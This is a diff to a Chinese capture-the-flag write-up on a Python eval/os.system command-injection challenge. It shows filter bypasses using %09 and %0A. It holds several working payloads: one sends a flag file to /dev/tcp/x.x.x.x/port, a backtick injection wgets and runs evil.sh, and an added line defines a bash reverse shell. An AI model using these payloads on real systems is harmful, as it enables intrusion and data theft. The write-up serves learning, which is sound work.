@@ -339,9 +339,7 @@ pass
 return str(data)
 ```
 
-
-
-这里首先是空格的过滤用换行绕过
+空格的过滤需要用/t(%09)和/n(%0A)绕过
 
 在自己的服务器上nc -n -lvvp port，再用payload打就可以先ls看一下flag文件名字然后再打印flag出来。
 
@@ -351,7 +349,7 @@ payload:`%27%27%271%27%0Acat%09/Th1s*%09%3E%09/dev/tcp/x.x.x.x/port%0A%23%273%27
 
 ```python
 echo {0} {1} '''1'
-cat /T* > /dev/tcp/x.x.x.x/port
+cat /Th1s* > /dev/tcp/x.x.x.x/port
 #'3'''> ./tmp/log.txt
 
 ```
@@ -366,10 +364,12 @@ os.system的时候#注释后面内容 cat这个语句被执行
 
 #### 解法二 
 
-来自vidar summer师傅的思路
+来自协会summer师傅的思路
 
 num = "1+1#\`wget\thttp://x.x.x.x:60056/evil.sh\`"
 num = "1+1#\`bash\tevil.sh\`"
+
+evi.sh:bash -i >& /dev/tcp/ip/port 0>&1
 
 这里#在python中确实会注释后面的内容，eval不会报错因为反引号内容被注释了，但是在os.system里面由于#在双引号中，反引号里面的内容在shell里代码会被执行，#只会被当作一个字符，这点非常神奇，学习了两位师傅的解法后发现都用了#去绕过，但是具体的利用方式也不一样，非常巧妙，学到了很多。
 
